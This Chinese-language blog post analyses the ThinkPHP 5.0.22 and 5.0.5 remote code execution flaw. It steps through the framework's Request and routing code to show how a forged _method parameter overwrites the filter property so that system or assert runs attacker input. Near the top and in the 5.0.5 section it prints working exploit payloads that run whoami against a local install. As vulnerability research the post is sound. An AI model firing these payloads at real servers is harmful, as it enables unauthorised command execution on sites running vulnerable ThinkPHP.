---
title: thinkphp5.x-RCE分析
author: p0desta
comment: true
date: 2019-02-1 21:03:28
tags: "代码审计" 
categories: web
---

#### thinkphp5.0.22

开debug模式,

```
http://127.0.0.1:10080/thinkphp_5.0.22/public/
_method=__construct&filter[]=system&method=get&get[]=whoami
```

<!-- more -->

关debug模式

```
http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha

POST:

_method=__construct&filter[]=system&method=get&get[]=whoami
```



断点我直接下在了最后的RCE的地方,首先看一下调用堆栈

![](https://ws1.sinaimg.cn/large/006tNc79ly1fzpot17mzxj30l40fejtm.jpg)

在这个调用堆栈里其实少了一个关键的一次调用,从`routeCheck`到`$method = strtolower($request->method());`这个地方,

先看一下这个地方

![](https://ws2.sinaimg.cn/large/006tNc79ly1fzppfxxk0xj30y40d8dj4.jpg)

在`request.php`526行

```php
if (isset($_POST[Config::get('var_method')])) {
    $this->method = strtoupper($_POST[Config::get('var_method')]);
    $this->{$this->method}($_POST);
```

在`think\config\app.php`中可以看到

```
    // 表单请求类型伪装变量
    'var_method'             => '_method',
```

那么我我们可以通过传递`_method`参数,然后进入`$this->{$this->method}($_POST);`调用Request类中的任意方法,`$_POST`就是传入的参数,也就是说可以实现任意方法任意参数的调用,继续看构造函数

```php
    protected function __construct($options = [])
    {
        foreach ($options as $name => $item) {
            if (property_exists($this, $name)) {
                $this->$name = $item;
            }
        }
        if (is_null($this->filter)) {
            $this->filter = Config::get('default_filter');
        }

        // 保存 php://input
        $this->input = file_get_contents('php://input');
    }
```

`$options=>$_POST`,然后判断类中是否有这个属性,如果有即赋值



继续往下走,通过`$data = *self*::exec($dispatch, $config);`,因为`type=method`进入到

```php
case 'method': // 回调方法
    $vars = array_merge(Request::instance()->param(), $dispatch['var']);
    $data = self::invokeMethod($dispatch['method'], $vars);
    break;
```

然后进入到

```
if (empty($this->mergeParam)) {
    $method = $this->method(true);
```

这里还是会进入到method方法,但是这次为true，进入的分支不同,然后进入到server方法,接着

```
return $this->input($this->server, false === $name ? false : strtoupper($name), $default, $filter);
```

进入到input方法,断点停在了` $this->filterValue($data, $name, $filter);`但是往上看

```
$filter = $this->getFilter($filter, $default);
```

有个赋值的操作,跟进看一下

```php
    protected function getFilter($filter, $default)
    {
        if (is_null($filter)) {
            $filter = [];
        } else {
            $filter = $filter ?: $this->filter;
            if (is_string($filter) && false === strpos($filter, '/')) {
                $filter = explode(',', $filter);
            } else {
                $filter = (array) $filter;
            }
        }

        $filter[] = $default;

        return $filter;
    }
```

因为一开始`filter`变量被我们覆盖成了`system`,所以没影响,最后进入到

```php
    private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);
        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
```

但是到这里发现了问题,`$value`不对,想一下为什么不对,原因是我把断点下在了RCE的地方,但是呢第一次调用就停了,RCE的地方还得往下走,继续回到`param`方法,将当前请求参数和URL地址中的参数合并

```
// 当前请求参数和URL地址中的参数合并
$this->param      = array_merge($this->param, $this->get(false), $vars, $this->route(false));
```

执行到最后再次进入input方法

```
return $this->input($this->param, $name, $default, $filter);
```

这次`data`是数组,进入与刚才不一样的分支

```
if (is_array($data)) {
    array_walk_recursive($data, [$this, 'filterValue'], $filter);
    reset($data);
} 
```

`array_walk_recursive`函数会对数组中的成员递归的调用`filterValue`,进入到

```
$value = call_user_func($filter, $value); //$filter:system  $value:whoami
```



然后解释一下为什么路由要有`s=captcha`,`vendor/think-captcha/src/helper.php`中

```php
\think\Route::get('captcha/[:id]', "\\think\\captcha\\CaptchaController@index");
```

可以看到对应的路有信息,然后在route.php的1513-1519行

```
} elseif (false !== strpos($route, '\\')) {
    // 路由到方法
    list($path, $var) = self::parseUrlPath($route);
    $route            = str_replace('/', '@', implode('/', $path));
    $method           = strpos($route, '@') ? explode('@', $route) : $route;
    $result           = ['type' => 'method', 'method' => $method, 'var' => $var];
} 
```

可以看到规则,因此type为mehod。
#### thinkphp5.0.5

payload

```
http://127.0.0.1:10080/thinkphp_5.0.5/public/

POST:
_method=__construct&filter[]=assert&method=GET&get[]=system('whoami');
```

看下调用堆栈

![](https://ws3.sinaimg.cn/large/006tNc79ly1fzqwzllxivj30k60bejsz.jpg)

前面到调用Request类中的任意方法的过程是一样的,

```
filter[]=assert
get[]=system('whoami');
```

因为默认开着debug,进入到

```
if (self::$debug) {
    Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
    Log::record('[ HEADER ] ' . var_export($request->header(), true), 'info');
    Log::record('[ PARAM ] ' . var_export($request->param(), true), 'info');
}
```

`$request->param`中,然后到

```php
    public function param($name = '', $default = null, $filter = '')
    {
        if (empty($this->param)) {
            $method = $this->method(true);
            // 自动获取请求变量
            switch ($method) {
                case 'POST':
                    $vars = $this->post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this->put(false);
                    break;
                default:
                    $vars = [];
            }
            // 当前请求参数和URL地址中的参数合并
            $this->param = array_merge($this->get(false), $vars, $this->route(false));
        }
        if (true === $name) {
            // 获取包含文件上传信息的数组
            $file = $this->file();
            $data = array_merge($this->param, $file);
            return $this->input($data, '', $default, $filter);
        }
        return $this->input($this->param, $name, $default, $filter);
    }
```

因为上面请求了method为GET,那么会先将参数合并,然后进入input

这里因为上面赋值操作也让`get`为`system('whoami')`,

继续进入input中

![](https://ws3.sinaimg.cn/large/006tNc79ly1fzqyaqlxx1j314k0hkgp9.jpg)